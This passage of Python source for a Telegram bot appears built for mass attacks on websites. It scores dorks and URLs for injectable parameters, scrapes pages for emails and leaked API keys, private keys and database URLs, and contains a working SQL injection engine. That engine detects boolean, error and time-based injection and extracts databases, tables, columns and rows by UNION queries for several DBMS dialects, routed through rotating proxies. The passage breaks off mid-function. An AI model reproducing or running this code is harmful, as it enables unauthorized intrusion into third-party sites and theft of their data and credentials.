                "\n📥 Total   : <code>%s</code>\n"
                "📦 Batch   : <code>%d/%d</code> • %s\n"
                "🔍 Checked : <code>%s/%s</code> %s\n"
                "✅ Alive   : <code>%d</code>"
                % (fmt(st["total"]), st.get("batch", 1), st.get("batches", 1),
                   fmt(st.get("batch_size", proxy_batch_size())),
                   fmt(st["done"]), fmt(st["total"]),
                   bar(st["done"] / max(1, st["total"]) * 100), st["alive"]),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

    good = await check_proxies_batched(px, progress=chk_prog)
    save_proxy_pool(good)
    took = time.time() - t0
    _nb = (len(px) + proxy_batch_size() - 1) // max(1, proxy_batch_size())
    txt = (H("PROXY — DONE") + "\n\n"
           "📥 Scraped  : <code>%s</code>\n"
           "🔍 Checked  : <code>%s</code> (batch of %s × %d)\n"
           "✅ Alive    : <code>%d</code>\n"
           "⏱ Time     : <code>%.1fs</code>\n\n"
           "🌐 Sources  : <code>%d/%d</code> OK • raw lines: <code>%s</code>"
           % (fmt(len(px)), fmt(len(px)), fmt(proxy_batch_size()), _nb, len(good), took,
              PSTATS.get("sources_ok", 0), len(PROXY_SOURCES), fmt(PSTATS.get("raw", 0))))
    if good:
        txt += "\n⚡ Best: <code>%d ms</code>\n\n<b>Top 5:</b>\n%s" % (
            good[0]["ms"], "\n".join("• <code>%s</code> — %dms"
                                     % (esc(g["url"].replace("http://", "")), g["ms"])
                                     for g in good[:5]))
        txt += "\n\n✅ Parser ab inhe use karega."
    elif PSTATS.get("sources_ok", 0) == 0:
        txt += ("\n\n⚠️ <b>Koi source khula hi nahi</b> — net/DNS block.\n"
                "👉 WiFi ↔ mobile data switch karo, ya manual file banao.")
    else:
        txt += ("\n\n⚠️ Sources khule par koi proxy alive nahi.\n"
                "👉 Thodi der baad dobara scan karo.")
    kb = RK([
        [InlineKeyboardButton("🔁 SCAN AGAIN", callback_data="px:run")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:proxy")],
    ])
    try:
        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_proxy_stat(update, context):
    q = update.callback_query
    pool = PROXIES or load_proxy_pool()
    d = jload("proxies", {})
    txt = (H("PROXY POOL") + "\n\n"
           "✅ Alive    : <code>%d</code>\n"
           "📄 Manual   : <code>%d</code>\n"
           "🕐 Updated  : <code>%s</code>\n\n%s"
           % (len(pool), len(manual_proxies()), esc(d.get("at") or "—"),
              short_list([p["url"].replace("http://", "") + (" (%dms)" % p.get("ms", 0))
                          for p in pool[:12]], 12)))
    try:
        await q.edit_message_text(txt, reply_markup=kb_back("m:proxy"), parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_proxy_clear(update, context):
    q = update.callback_query
    save_proxy_pool([])
    try:
        await q.edit_message_text(H("PROXY") + "\n\n🗑 Pool clear ho gaya.",
                                  reply_markup=kb_back("m:proxy"), parse_mode=ParseMode.HTML)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: QUALITY / RANDOMIZER / DUMPER
# ═══════════════════════════════════════════════════════════════════════════════
QA_META = {
    "keywords": ("🔑 KEYWORDS", "keywords", "shopify store, crypto wallet"),
    "dorks": ("🎯 DORKS", "dorks", "inurl:admin.php site:gov.in"),
    "urls": ("🔗 URLs", "urls", "https://site.com/page.php?id=5"),
}


async def tool_qa(update, context):
    q = update.callback_query
    txt = (H("QUALITY CHECKER", "3 types", slot="qa") + "\n\n"
           "%s\n\n"
           "🔑 <b>%s</b>\n   %s\n\n"
           "🎯 <b>%s</b>\n   %s\n\n"
           "🔗 <b>%s</b>\n   %s\n\n"
           "%s"
           % (B("What do you want to check?"),
              B("KEYWORDS"), P("search value, intent, length"),
              B("DORKS"), P("operators, structure, junk"),
              B("URLS"), P("params, tracking, junk host"),
              P("The bot detects the type — if it is wrong, it tells you")))
    try:
        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=RK([
            [InlineKeyboardButton("🔑 KEYWORDS", callback_data="qa:keywords")],
            [InlineKeyboardButton("🎯 DORKS", callback_data="qa:dorks")],
            [InlineKeyboardButton("🔗 URLS", callback_data="qa:urls")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
        ]))
    except Exception:
        pass


def score_url(u: str) -> tuple:
    """URL quality 0-100 — clean, params, tracking, junk host."""
    score, why = 50, []
    u = str(u or "").strip()
    if not u.startswith("http"):
        return 0, ["does not start with http"]
    p = urlparse(u)
    host = (p.hostname or "").lower()
    if not host:
        return 10, ["no host found"]
    base = ".".join(host.split(".")[-2:])
    if host in JUNK_HOSTS or base in JUNK_HOSTS:
        return 5, ["junk/known host"]
    if p.query:
        score += 15
        why.append("+15 query params")
        if re.search(r"=\s*$", p.query) or re.search(r"=[&]?", p.query):
            score += 5
            why.append("+5 param with a value")
    else:
        why.append("no query (less interesting)")
    tq = _strip_track(p.query or "")
    if tq != (p.query or ""):
        score -= 10
        why.append("-10 tracking params")
    if len(p.path or "") > 1:
        score += 8
        why.append("+8 has a path")
    else:
        why.append("root path")
    if re.search(r"\.(php|asp|aspx|jsp|do|action)$", (p.path or "").lower()):
        score += 10
        why.append("+10 dynamic page")
    low = u.lower()
    for b in ("javascript:", "mailto:", "#", "undefined", "null"):
        if b in low:
            score -= 12
            why.append("-12 %s" % b)
    if len(u) > 300:
        score -= 12
        why.append("-12 too long")
    if re.search(r"(?:^|[?&])(id|pid|cat|page|item|product|user|file|doc|view|action)=", p.query or "", re.I):
        score += 10
        why.append("+10 injectable-style param")
    return max(0, min(100, score)), why


def _qa_score(kind: str, items: list) -> list:
    out = []
    for it in items:
        if kind == "dorks":
            out.append(score_dork(it)[0])
        elif kind == "urls":
            out.append(score_url(it)[0])
        else:
            out.append(score_keyword(it)[0])
    return out


async def cb_qa_type(update, context, kind: str):
    q = update.callback_query
    meta = QA_META.get(kind)
    if not meta:
        return
    label, want, ex = meta
    context.user_data["qa_kind"] = kind
    try:
        await q.edit_message_text(
            (H("QUALITY — %s" % label, "0-100 score") + "\n\n"
             "📥 <b>%s</b>\n\n<code>%s</code>\n\n%s"
             % (B("Send (one per line)"), esc(ex), P("Max 200 lines"))),
            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:qa"))
    except Exception:
        pass
    await_set(context, "qa_" + kind)


async def input_qa_kind(update, context, kind: str, text: str):
    meta = QA_META.get(kind)
    label = meta[0] if meta else kind
    ok, err = kind_check(text, kind, label)
    if not ok:
        await update.effective_message.reply_text(err, parse_mode=ParseMode.HTML,
                                                  reply_markup=kb_back("m:qa"))
        await_set(context, "qa_" + kind)
        return
    items = _lines(text)[:200]
    if not items:
        await update.effective_message.reply_text("❌ Nothing found.")
        return
    scores = _qa_score(kind, items)
    avg = sum(scores) / len(scores)
    pairs = sorted(zip(scores, items), key=lambda z: -z[0])
    buckets = {"b80": 0, "b65": 0, "b45": 0, "b25": 0, "b0": 0}
    for sc in scores:
        if sc >= 80:
            buckets["b80"] += 1
        elif sc >= 65:
            buckets["b65"] += 1
        elif sc >= 45:
            buckets["b45"] += 1
        elif sc >= 25:
            buckets["b25"] += 1
        else:
            buckets["b0"] += 1
    body = [(H("QUALITY REPORT — %s" % label, "avg %.0f/100" % avg)),
            "",
            KV("Total", "<code>%s</code>" % fmt(len(items)), "📦"),
            "",
            KV("80+", "<code>%s</code>" % fmt(buckets["b80"]), "🔥"),
            KV("65-79", "<code>%s</code>" % fmt(buckets["b65"]), "✅"),
            KV("45-64", "<code>%s</code>" % fmt(buckets["b45"]), "🟡"),
            KV("25-44", "<code>%s</code>" % fmt(buckets["b25"]), "🟠"),
            KV("<25", "<code>%s</code>" % fmt(buckets["b0"]), "🔴"),
            "",
            "<b>%s</b>" % B("Top 5")]
    for sc, it in pairs[:5]:
        body.append("<b>%d</b> %s <code>%s</code>" % (sc, quality_label(sc), esc(it[:90])))
    if kind == "dorks":
        grades = {}
        for it in items:
            g = dork_score_full(it)["grade"]
            grades[g] = grades.get(g, 0) + 1
        body.insert(4, KV("Grade", " ".join("%s %s:<code>%d</code>"
                                            % (GRADE_EMOJI[g], g, grades[g])
                                            for g in ("S+", "S", "A", "B", "C", "D", "F")
                                            if g in grades), "🎖"))
        dims_avg = {}
        for it in items:
            for k2, v2 in dork_score_full(it)["dims"].items():
                dims_avg[k2] = dims_avg.get(k2, 0) + v2
        body.insert(5, "<i>9 dims: %s</i>"
                    % " • ".join("%s %.0f" % (k2, v2 / max(1, len(items)))
                                 for k2, v2 in dims_avg.items()))
    body.append("")
    body.append("<b>%s</b>" % B("Kamzor 3"))
    for sc, it in pairs[-3:]:
        body.append("<b>%d</b> %s <code>%s</code>" % (sc, quality_label(sc), esc(it[:90])))
    for ch in chunk_lines("\n".join(body))[:3]:
        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
    path, cnt = dump_text(["%3d  %s" % (s_, i_) for s_, i_ in zip(scores, items)],
                          "quality_" + kind, "PYTHON SNAKE — %s quality" % kind)
    await send_file(update, path, "📊 %s %s scored • avg %.0f" % (fmt(cnt), kind, avg))
    hq = [i_ for s_, i_ in zip(scores, items) if s_ >= 80]
    if hq:
        hp, hn = dump_text(hq, "quality_best", "PYTHON SNAKE — only 80+")
        await send_file(update, hp, "🔥 %s best (80+)" % fmt(hn))
    if kind == "dorks" and len(items) >= 20:      # grade-wise auto split
        tiers = {"S": [], "A": [], "B": [], "C": []}
        for it in items:
            g = dork_score_full(it)["grade"]
            key = "S" if g in ("S+", "S") else g
            if key in tiers:
                tiers[key].append(it)
        for key, lst in tiers.items():
            if len(lst) < 2:
                continue
            tp, tn = dump_text(lst, "grade_" + key, "PYTHON SNAKE — grade %s" % key)
            await send_file(update, tp, "%s Grade %s — %s dorks"
                            % (GRADE_EMOJI.get(key, "•"), key, fmt(tn)))
    await update.effective_message.reply_text("⬅️ Menu", reply_markup=kb_back("m:qa"))
    await_clear(context)


async def tool_rand(update, context):
    q = update.callback_query
    last = context.user_data.get("last_dorks") or []
    kb = RK([
        [InlineKeyboardButton("📥 LAST %d DORKS" % len(last), callback_data="rd:last")],
        [InlineKeyboardButton("✍️ MANUAL", callback_data="rd:manual")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
    ])
    try:
        await q.edit_message_text(H("RANDOMIZER") + "\n\n"
                                  "Shuffles dorks + mutates operators "
                                  "(inurl ↔ allinurl, site ↔ site:.com …)",
                                  reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_rand_last(update, context):
    q = update.callback_query
    dorks = context.user_data.get("last_dorks") or []
    if not dorks:
        try:
            await q.answer("Run DORKER first", show_alert=True)
        except Exception:
            pass
        return
    out = randomize_dorks(dorks, n=min(len(dorks) * 2, 300))
    path, cnt = dump_text(out, "random", "PYTHON SNAKE — randomized dorks")
    try:
        await q.edit_message_text(H("RANDOMIZER — DONE") + "\n\n🔀 %s dorks\n\n%s"
                                  % (fmt(cnt), short_list(out[:10], 10)),
                                  reply_markup=kb_back("m:rand"), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    await send_file(update, path, "🎲 %d randomized" % cnt)


async def cb_rand_manual(update, context):
    q = update.callback_query
    try:
        await q.edit_message_text(H("RANDOMIZER") + "\n\nPaste dorks:",
                                  reply_markup=kb_back("m:rand"), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    await_set(context, "rand_items")


async def input_rand(update, context, text: str):
    items = [x.strip() for x in text.split("\n") if x.strip()]
    if not items:
        return
    out = randomize_dorks(items, n=min(len(items) * 2, 300))
    path, cnt = dump_text(out, "random", "PYTHON SNAKE — randomized dorks")
    await update.effective_message.reply_text(
        H("RANDOMIZER — DONE") + "\n\n🔀 %s dorks\n\n%s" % (fmt(cnt), short_list(out[:8], 8)),
        parse_mode=ParseMode.HTML, reply_markup=kb_back("m:rand"))
    await send_file(update, path, "🎲 %d randomized" % cnt)
    await_clear(context)


SECRET_RX = [
    ("google_api", r"AIza[0-9A-Za-z_\-]{35}"),
    ("aws_key", r"AKIA[0-9A-Z]{16}"),
    ("stripe", r"sk_live_[0-9A-Za-z]{20,}"),
    ("github", r"gh[pousr]_[0-9A-Za-z]{20,}"),
    ("slack", r"xox[baprs]-[0-9A-Za-z\-]{10,}"),
    ("jwt", r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"),
    ("private_key", r"-----BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"),
    ("db_url", r"(?:mysql|postgres|postgresql|mongodb(?:\+srv)?|redis|amqp)://[^\s\"'<>]{8,}"),
]
SECRET_RX = [(n, re.compile(p)) for n, p in SECRET_RX]
FORM_RX = re.compile(r"<form\b[^>]*>", re.I)
INPUT_RX = re.compile(r"<input\b[^>]*>", re.I)
ATTR_RX = re.compile(r"""(\w+)\s*=\s*["']([^"']*)["']""")


def _attrs(tag: str) -> dict:
    return {k.lower(): v for k, v in ATTR_RX.findall(tag)}


def dump_extract(url: str, status: int, headers: dict, body: str) -> dict:
    """Ek page se saara kaam ka data nikaalo (asli parse, koi mock nahi)."""
    b = str(body or "")
    h = {str(k).lower(): v for k, v in (headers or {}).items()}
    rec = {"url": url, "status": status, "server": str(h.get("server") or ""),
           "ctype": str(h.get("content-type") or ""), "bytes": len(b),
           "title": "", "forms": [], "endpoints": [], "params": [], "emails": [],
           "js": [], "secrets": [], "comments": [], "tables": [], "meta": {},
           "powered_by": str(h.get("x-powered-by") or "")}
    m = re.search(r"<title[^>]*>(.*?)</title>", b, re.I | re.S)
    if m:
        rec["title"] = re.sub(r"\s+", " ", m.group(1)).strip()[:120]
    m = re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)', b, re.I)
    if m:
        rec["meta"]["generator"] = m.group(1)[:60]
    # forms (har form ke apne input fields — asli HTML parse)
    fmatches = list(FORM_RX.finditer(b))[:25]
    for i, fm in enumerate(fmatches):
        fa = _attrs(fm.group(0))
        seg_end = fmatches[i + 1].start() if i + 1 < len(fmatches) else min(len(b), fm.end() + 6000)
        seg = b[fm.end():seg_end]
        fields = []
        for itag in INPUT_RX.findall(seg)[:40]:
            nm = (_attrs(itag).get("name") or "").strip()
            if nm and nm not in fields:
                fields.append(nm[:40])
        rec["forms"].append({"action": (fa.get("action") or "")[:160],
                             "method": (fa.get("method") or "get").lower(),
                             "id": (fa.get("id") or fa.get("name") or "")[:40],
                             "fields": fields})
    # inputs (form ke bahar wale bhi, params list ke liye)
    for itag in INPUT_RX.findall(b)[:200]:
        nm = (_attrs(itag).get("name") or "").strip()
        if nm and nm not in rec["params"]:
            rec["params"].append(nm[:40])
    # links + endpoints
    host = urlparse(url).hostname or ""
    for href in re.findall(r"""href\s*=\s*["']([^"'#]+)["']""", b, re.I)[:400]:
        if href.startswith(("javascript:", "mailto:", "tel:", "data:")):
            continue
        full = urljoin(url, href)
        p = urlparse(full)
        if p.netloc and host and host not in p.netloc:
            continue
        qs = [k for k, _v in parse_qsl(p.query, keep_blank_values=True)]
        for k in qs:
            if k and k not in rec["params"]:
                rec["params"].append(k[:40])
        rec["endpoints"].append(full[:300])
    rec["endpoints"] = _uniq(rec["endpoints"])[:200]
    # js files
    for src in re.findall(r"""<script[^>]+src\s*=\s*["']([^"']+)["']""", b, re.I)[:60]:
        rec["js"].append(urljoin(url, src)[:300])
    rec["js"] = _uniq(rec["js"])[:40]
    # emails
    rec["emails"] = _uniq(re.findall(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,12}", b))[:60]
    # comments
    for c in re.findall(r"<!--(.*?)-->", b, re.S)[:40]:
        c = re.sub(r"\s+", " ", c).strip()
        if c and len(c) > 3 and not c.lower().startswith(("[if", "google")):
            rec["comments"].append(c[:160])
    # table / column hints (koi SQL inject nahi — sirf page pe likhe naam)
    for t in re.findall(r"(?:from|join|into|update)\s+[`\"']?([a-z_][a-z0-9_]{2,30})[`\"']?",
                        b, re.I)[:40]:
        if t.lower() not in ("the", "this", "that", "your", "select", "table"):
            rec["tables"].append(t)
    rec["tables"] = _uniq(rec["tables"])[:30]
    # secrets
    for name, rx in SECRET_RX:
        for hit in rx.findall(b)[:3]:
            rec["secrets"].append((name, str(hit)[:80]))
    return rec


def dump_record_text(rec: dict) -> list:
    """Ek record ko readable lines me — copy-paste safe (plain values)."""
    L_ = ["=" * 62, "URL     : " + rec["url"], "Status  : %s   Server: %s   Type: %s"
          % (rec["status"], rec["server"] or "-", rec["ctype"] or "-"),
          "Size    : %s bytes" % fmt(rec["bytes"]),
          "Title   : " + (rec["title"] or "-")]
    if rec.get("powered_by"):
        L_.append("Powered : " + rec["powered_by"])
    if rec["meta"]:
        L_.append("Meta    : " + ", ".join("%s=%s" % kv for kv in rec["meta"].items()))
    if rec["forms"]:
        L_.append("-" * 62)
        L_.append("FORMS (%d)" % len(rec["forms"]))
        for f in rec["forms"]:
            L_.append("  [%s] %s   id=%s" % (f["method"].upper(), f["action"] or "self",
                                             f["id"] or "-"))
            if f.get("fields"):
                L_.append("       fields: " + ", ".join(f["fields"]))
    if rec["params"]:
        L_.append("-" * 62)
        L_.append("PARAMETERS (%d)" % len(rec["params"]))
        L_.append("  " + ", ".join(rec["params"]))
    if rec["endpoints"]:
        L_.append("-" * 62)
        L_.append("ENDPOINTS (%d)" % len(rec["endpoints"]))
        L_ += ["  " + e for e in rec["endpoints"]]
    if rec["js"]:
        L_.append("-" * 62)
        L_.append("JS FILES (%d)" % len(rec["js"]))
        L_ += ["  " + j for j in rec["js"]]
    if rec["emails"]:
        L_.append("-" * 62)
        L_.append("EMAILS (%d)" % len(rec["emails"]))
        L_ += ["  " + e for e in rec["emails"]]
    if rec["comments"]:
        L_.append("-" * 62)
        L_.append("HTML COMMENTS (%d)" % len(rec["comments"]))
        L_ += ["  " + c for c in rec["comments"]]
    if rec["tables"]:
        L_.append("-" * 62)
        L_.append("TABLE / COLUMN NAMES (%d)" % len(rec["tables"]))
        L_ += ["  " + t for t in rec["tables"]]
    if rec["secrets"]:
        L_.append("-" * 62)
        L_.append("POSSIBLE SECRETS (%d)" % len(rec["secrets"]))
        L_ += ["  %s: %s" % (n, v) for n, v in rec["secrets"]]
    L_.append("=" * 62)
    return L_



# ═══════════════════════════════════════════════════════════════════════════════
#  SQL DATA EXTRACTION  (sqlmap-style dump — databases → tables → columns → rows)
#  Sirf wahi URLs jinme injectable parameter asli request se confirm hota hai.
# ═══════════════════════════════════════════════════════════════════════════════
SQLI_MARK = "K3ySt0n3"
SQLI_SEP = "<br>"

# (quote, comment) — common real-world injection shapes
SQLI_STYLES = [("'", "-- -"), ("", "-- -"), ('"', "-- -"), ("'", "#"),
               ("')", "-- -"), ('")', "-- -"), ("')", "#"), ("'", "")]


def _sqli_url(raw: str, param: str, suffix: str) -> str:
    """Param ki ASLI value ke aage suffix jodo (replace nahi — warna injection tootega)."""
    try:
        u = urlparse(raw)
        pairs = parse_qsl(u.query, keep_blank_values=True)
        done, newp = False, []
        for k, v in pairs:
            if k == param and not done:
                newp.append((k, v + suffix))
                done = True
            else:
                newp.append((k, v))
        if not done:
            newp.append((param, suffix))
        return urlunparse(u._replace(query=urlencode(newp, quote_via=quote_plus),
                                     fragment=""))
    except Exception:
        return raw


def _sqli_norm(t) -> str:
    t = re.sub(r"\s+", " ", _html.unescape(str(t or "")))
    return t[:8000]


def _sqli_diff(a, b) -> int:
    """Do pages me kitne characters ka farq hai (0 = bilkul same)."""
    a, b = _sqli_norm(a), _sqli_norm(b)
    if a == b:
        return 0
    if not a or not b:
        return max(len(a), len(b))
    sm = difflib.SequenceMatcher(None, a, b, autojunk=False)
    return sum(max(i2 - i1, j2 - j1) for tag, i1, i2, j1, j2 in sm.get_opcodes()
               if tag != "equal")


def _sqli_body(r) -> str:
    return (r or {}).get("body") or ""


def _sqli_flat(x) -> str:
    return re.sub(r"\s+", " ", _html.unescape(str(x or ""))).strip()


def _sqli_split(raw: str) -> list:
    return [x.strip() for x in str(raw or "").split(SQLI_SEP) if x.strip()]


async def _sqli_req(session, url: str, timeout: float, rot=None, budget=None) -> dict:
    """Ek request — rot proxy pehle. budget ho to request count hoti hai."""
    if budget is not None:
        if budget.get("left", 0) <= 0:
            return {"status": 0, "len": 0, "body": "", "err": "budget"}
        budget["left"] = budget.get("left", 0) - 1
        budget["used"] = budget.get("used", 0) + 1
    kw = {"headers": {"User-Agent": random.choice(UA_LIST), "Accept": "*/*"},
          "timeout": aiohttp.ClientTimeout(total=timeout), "ssl": False,
          "allow_redirects": True, "max_redirects": 4}
    if rot:
        px = rot.next()
        if px:
            try:
                pxc, _h, _i, _s = await proxy_connect_url(px)
                kw["proxy"] = pxc
            except Exception:
                pass
    try:
        async with session.get(url, **kw) as r:
            body = await r.text(errors="ignore")
            return {"status": r.status, "len": len(body), "body": body[:300000],
                    "ms": 0}
    except Exception as exc:
        return {"status": 0, "len": 0, "body": "", "err": str(exc)[:70]}


def _sqli_dbms_of(responses) -> str:
    for r in responses:
        if r:
            hits = dbms_fingerprint(_sqli_body(r))
            if hits:
                return hits[0][0]
    return ""


# ── dialect helpers ─────────────────────────────────────────────────────────
def _sqli_lit(dbms: str, val: str) -> str:
    if (dbms or "MySQL") == "MySQL":
        return "0x" + str(val).encode("utf-8", "ignore").hex()
    return "'" + str(val).replace("'", "''") + "'"


def _sqli_ord(dbms: str) -> str:
    d = dbms or "MySQL"
    if d == "SQLite":
        return "UNICODE"
    return "ORD" if d == "MySQL" else "ASCII"


def _sqli_sub(dbms: str) -> str:
    return "SUBSTR" if (dbms or "MySQL") in ("MySQL", "SQLite", "PostgreSQL") else "SUBSTRING"


def _sqli_concat(dbms: str, parts) -> str:
    d = dbms or "MySQL"
    if d in ("SQLite", "PostgreSQL", "Oracle"):
        return "(" + " || ".join(parts) + ")"
    return "CONCAT(" + ", ".join(parts) + ")"


def _sqli_quote_tbl(dbms: str, name: str) -> str:
    d = dbms or "MySQL"
    if d == "MySQL":
        return "`" + str(name).replace("`", "``") + "`"
    if d == "MSSQL":
        return "[" + str(name).replace("]", "]]") + "]"
    return '"' + str(name).replace('"', '""') + '"'


def _sqli_wrap(dbms: str, sql: str) -> str:
    return _sqli_concat(dbms, ["'%s'" % SQLI_MARK, "(%s)" % sql, "'%s'" % SQLI_MARK])


def sqli_sql(dbms: str, key: str, table: str = "", cols=None, offset: int = 0) -> str:
    """Dialect ke hisaab se SQL. key: current_db|dbs|tables|columns|row|count."""
    d = dbms or "MySQL"
    cols = list(cols or [])
    if key == "current_db":
        return {"MySQL": "SELECT DATABASE()", "SQLite": "SELECT 'main'",
                "PostgreSQL": "SELECT current_database()",
                "MSSQL": "SELECT DB_NAME()",
                "Oracle": "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL"}.get(
            d, "SELECT DATABASE()")
    if key == "dbs":
        return {"MySQL": "SELECT GROUP_CONCAT(schema_name SEPARATOR '<br>') "
                         "FROM information_schema.schemata",
                "PostgreSQL": "SELECT STRING_AGG(schema_name,'<br>') "
                              "FROM information_schema.schemata",
                "MSSQL": "SELECT STRING_AGG(name,'<br>') FROM sys.databases",
                "SQLite": "SELECT 'main'",
                "Oracle": "SELECT LISTAGG(username,'<br>') WITHIN GROUP (ORDER BY username) "
                          "FROM all_users"}.get(
            d, "SELECT GROUP_CONCAT(schema_name SEPARATOR '<br>') "
               "FROM information_schema.schemata")
    if key == "tables":
        return {"MySQL": "SELECT GROUP_CONCAT(table_name SEPARATOR '<br>') "
                         "FROM information_schema.tables WHERE table_schema=DATABASE()",
                "PostgreSQL": "SELECT STRING_AGG(table_name,'<br>') "
                              "FROM information_schema.tables "
                              "WHERE table_schema=current_schema()",
                "MSSQL": "SELECT STRING_AGG(name,'<br>') FROM sysobjects WHERE xtype='U'",
                "SQLite": "SELECT GROUP_CONCAT(name,'<br>') FROM sqlite_master "
                          "WHERE type='table'",
                "Oracle": "SELECT LISTAGG(table_name,'<br>') WITHIN GROUP "
                          "(ORDER BY table_name) FROM user_tables"}.get(
            d, "SELECT GROUP_CONCAT(table_name SEPARATOR '<br>') "
               "FROM information_schema.tables WHERE table_schema=DATABASE()")
    if key == "columns":
        lit = _sqli_lit(d, table)
        esc = str(table).replace("'", "''")
        return {"MySQL": "SELECT GROUP_CONCAT(column_name SEPARATOR '<br>') "
                         "FROM information_schema.columns WHERE table_name=%s" % lit,
                "PostgreSQL": "SELECT STRING_AGG(column_name,'<br>') "
                              "FROM information_schema.columns WHERE table_name=%s" % lit,
                "MSSQL": "SELECT STRING_AGG(name,'<br>') FROM syscolumns "
                         "WHERE id=OBJECT_ID('%s')" % esc,
                "SQLite": "SELECT GROUP_CONCAT(name,'<br>') FROM pragma_table_info('%s')" % esc,
                "Oracle": "SELECT LISTAGG(column_name,'<br>') WITHIN GROUP (ORDER BY column_id) "
                          "FROM user_tab_columns WHERE table_name='%s'" % esc.upper()}.get(
            d, "SELECT GROUP_CONCAT(column_name SEPARATOR '<br>') "
               "FROM information_schema.columns WHERE table_name=%s" % lit)
    if key == "count":
        return "SELECT COUNT(*) FROM " + _sqli_quote_tbl(d, table)
    if key == "row":
        if not cols:
            return ""
        parts = []
        for c in cols:
            q = _sqli_quote_tbl(d, c)
            if d == "MySQL":
                parts.append("IFNULL(%s,'')" % q)
            elif d == "MSSQL":
                parts.append("ISNULL(CAST(%s AS NVARCHAR(MAX)),'')" % q)
            elif d == "PostgreSQL":
                parts.append("COALESCE(%s::text,'')" % q)
            else:
                parts.append("IFNULL(CAST(%s AS TEXT),'')" % q)
        expr = (" + '||' + ".join(parts)) if d == "MSSQL" else (" || '||' || ".join(parts))
        return "SELECT %s FROM %s LIMIT %d,1" % (
            expr, _sqli_quote_tbl(d, table), int(offset))
    return ""


# ── detection ───────────────────────────────────────────────────────────────
async def sqli_detect(session, raw: str, param: str, timeout: float = 8.0,
                      rot=None, budget=None) -> dict:
    """URL ke ek param me asli injection hai? TRUE vs FALSE page ka farq dekho."""
    out = {"raw": raw, "param": param, "ok": False, "why": "", "dbms": "",
           "tech": "", "quote": "", "comment": "", "true": None, "false": None,
           "base": None, "noise": 0}
    base = await _sqli_req(session, raw, timeout, rot, budget)
    if not base.get("status"):
        out["why"] = "no response (%s)" % (base.get("err") or "timeout")
        return out
    if base.get("status") in (401, 403, 429):
        out["why"] = "blocked (HTTP %s)" % base["status"]
        return out
    out["base"] = base
    err_hits = []          # (quote, comment, dbms)
    dbms_seen = _sqli_dbms_of([base])
    for q, c in SQLI_STYLES:
        # 1) DB error — sirf quote bhejo
        e = await _sqli_req(session, _sqli_url(raw, param, q + " " + c),
                            timeout, rot, budget)
        db = _sqli_dbms_of([e])
        dbms_seen = dbms_seen or db
        if db and not _sqli_dbms_of([base]) and e.get("status"):
            err_hits.append((q, c, db))
        # 2) boolean — TRUE page base jaisa, FALSE page alag
        t = await _sqli_req(session, _sqli_url(raw, param, q + " AND 1=1 " + c),
                            timeout, rot, budget)
        f = await _sqli_req(session, _sqli_url(raw, param, q + " AND 1=2 " + c),
                            timeout, rot, budget)
        if not t.get("status") or not f.get("status"):
            continue
        dbms_seen = dbms_seen or _sqli_dbms_of([t, f])
        d_tb = _sqli_diff(_sqli_body(t), _sqli_body(base))
        d_tf = _sqli_diff(_sqli_body(t), _sqli_body(f))
        noise = d_tb
        if d_tf >= 1 and d_tf > noise and noise <= max(30, int(0.03 * len(_sqli_norm(_sqli_body(base))))):
            out.update(ok=True, tech="boolean", quote=q, comment=c, true=t, false=f,
                       noise=noise, dbms=dbms_seen or "")
            break
    if not out["ok"]:
        if err_hits:
            q, c, db = err_hits[0]
            out.update(ok=True, tech="error", quote=q, comment=c, dbms=db)
        else:
            # 3) time-based (last resort, extraction nahi hogi)
            for q, c in (("'", "-- -"), ("", "-- -")):
                t1 = time.time()
                r1 = await _sqli_req(session, _sqli_url(raw, param, (q + " AND SLEEP(0) " + c).strip()),
                                     timeout, rot, budget)
                t2 = time.time()
                r2 = await _sqli_req(session, _sqli_url(raw, param, (q + " AND SLEEP(2) " + c).strip()),
                                     timeout, rot, budget)
                t3 = time.time()
                if r1.get("status") and r2.get("status") and (t3 - t2) - (t2 - t1) > 1.2:
                    out.update(ok=True, tech="time", quote=q, comment=c, dbms="MySQL")
                    out["why"] = "time-based blind — data extraction skipped (too slow)"
                    return out
            out["why"] = "no boolean / error / time difference"
            return out
    if not out["dbms"]:
        out["dbms"] = "MySQL"
        out["dbms_guess"] = True
    return out


async def _sqli_cols(session, det: dict, timeout: float, rot=None, budget=None) -> int:
    """ORDER BY se column count."""
    q, c = det["quote"], det["comment"]
    true_body = _sqli_body(det.get("true")) or _sqli_body(det.get("base"))
    cols = 0
    for n in range(1, 13):
        r = await _sqli_req(session, _sqli_url(det["raw"], det["param"],
                                               "%s ORDER BY %d %s" % (q, n, c)),
                            timeout, rot, budget)
        if not r.get("status") or _sqli_diff(_sqli_body(r), true_body) > max(30, det.get("noise", 0) + 10):
            cols = n - 1
            break
    return max(0, cols)


async def _sqli_union_pos(session, det: dict, cols: int, timeout: float,
                          rot=None, budget=None) -> int:
    """Kis column ki value page pe print hoti hai (0 = koi nahi)."""
    if not cols:
        return 0
    q, c = det["quote"], det["comment"]
    for i in range(cols):
        expr = ["1"] * cols
        expr[i] = _sqli_wrap(det.get("dbms") or "MySQL", "SELECT '%s'" % SQLI_MARK)
        payload = "%s UNION SELECT %s %s" % (q, ", ".join(expr), c)
        r = await _sqli_req(session, _sqli_url(det["raw"], det["param"], payload),
                            timeout, rot, budget)
        if r.get("status") and (SQLI_MARK * 2) in _html.unescape(_sqli_body(r)):
            return i + 1
    return 0


async def _sqli_union_text(session, det: dict, cols: int, pos: int, sql: str,
